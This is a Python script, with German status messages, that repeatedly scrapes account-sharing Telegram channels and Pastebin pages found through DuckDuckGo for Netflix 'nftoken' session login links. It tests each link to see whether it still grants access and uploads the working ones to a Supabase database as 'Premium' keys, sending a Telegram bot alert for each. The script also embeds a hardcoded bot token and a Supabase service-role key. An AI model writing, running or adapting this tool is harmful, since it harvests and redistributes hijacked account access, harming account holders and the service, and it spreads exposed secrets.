import requests
import re
import time
import os
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# PC BOT TOKEN
BOT_TOKEN = '9065030505:AAESuIx6VRBd2Bq4ZBMWw9r9Ac2MQTdXRtM'
CHAT_ID = '6584278242'

SUPABASE_URL = "https://drrbibjafmqcxqhxswfy.supabase.co" 
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRycmJpYmphZm1xY3hxaHhzd2Z5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MzQ2NjQ2NiwiZXhwIjoyMTA5MDQyNDY2fQ.XElFDbLqZT_bbRP9EomuZlH7gbflUni46fvGvm9hleo"

def get_headers():
    return {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}

TELEGRAM_CHANNELS = ["freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", "disney_plus_accounts", "crunchyroll_free"]

PATTERN = re.compile(r'(https?://(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)', re.IGNORECASE)

def clean_link(link):
    return link.replace('</a>', '').replace('<br>', '').replace('"', '').strip()

def test_link(link):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(link, headers=headers, allow_redirects=False, timeout=5)
        if r.status_code in [200, 301, 302] and 'login' not in r.headers.get('Location', '') and 'unsupported' not in r.headers.get('Location', ''):
            return True
    except: pass
    return False

def fake_hacker_logs():
    os.system('color 0a')
    print("=============================================")
    print(" [ PC GRABBER - CLOUD UPLOAD MODE ] ")
    print("=============================================")
    time.sleep(0.5)
    print("[*] Connecting to Supabase Cloud...")
    time.sleep(0.3)
    print("[*] Access Granted. Searching Everything...\n")

def upload_to_cloud(valid_items):
    if not valid_items: return
    
    for item in valid_items:
        try:
            newKey = 'CLM-' + os.urandom(4).hex().upper()
            meta = {"email": "NFToken Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
            
            r = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": "netflix"})
            
            if r.status_code == 201:
                print(f"[+] CLOUD UPLOAD: {newKey}")
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **PC FUND!**\n\n{newKey}", "parse_mode": "Markdown"})
                except: pass
            else:
                print(f"[-] Cloud Fehler: {r.status_code}")
        except Exception as e:
            print(f"[-] Upload Error: {e}")

def scan_telegram(channel):
    found = []
    try:
        print(f"[*] Scanning TG: @{channel}")
        r = requests.get(f"https://t.me/s/{channel}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        for m in PATTERN.findall(r.text):
            link = clean_link(m)
            if link and test_link(link): found.append(link)
    except Exception: pass 
    return found

def scan_duckduckgo():
    found = []
    try:
        print("[*] Scanne DuckDuckGo...")
        q = 'site:pastebin.com "nftoken="'
        r = requests.get(f"https://html.duckduckgo.com/html/?q={q}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        soup = BeautifulSoup(r.text, 'html.parser')
        for a in soup.select('.result__a')[:5]:
            url = a['href']
            if 'pastebin.com' in url and '/raw/' not in url:
                raw_url = url.replace('pastebin.com/', 'pastebin.com/raw/')
                raw_r = requests.get(raw_url, timeout=5)
                if raw_r.status_code == 200:
                    for m in PATTERN.findall(raw_r.text):
                        link = clean_link(m)
                        if link and test_link(link): found.append(link)
    except Exception: pass
    return found

if __name__ == '__main__':
    fake_hacker_logs()
    
    while True:
        try:
            print(f"\n[{time.strftime('%H:%M:%S')}] Starte Scan...")
            found_raw = []
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
                for res in results:
                    found_raw.extend(res)
                    
            found_raw.extend(scan_duckduckgo())
            found_raw = list(set(found_raw)) 
            
            if found_raw:
                valid = []
                for item in found_raw:
                    if test_link(item): valid.append(item)
                
                if valid:
                    print(f"[+] {len(valid)} Links gefunden! Lade in die Cloud...")
                    upload_to_cloud(valid)
            else:
                print("[-] Keine Links gefunden.")
                
            print(f"[*] Warte 60 Sekunden...")
            time.sleep(60)
            
        except Exception as e:
            print(f"[-] Fehler: {e}")
            time.sleep(30)
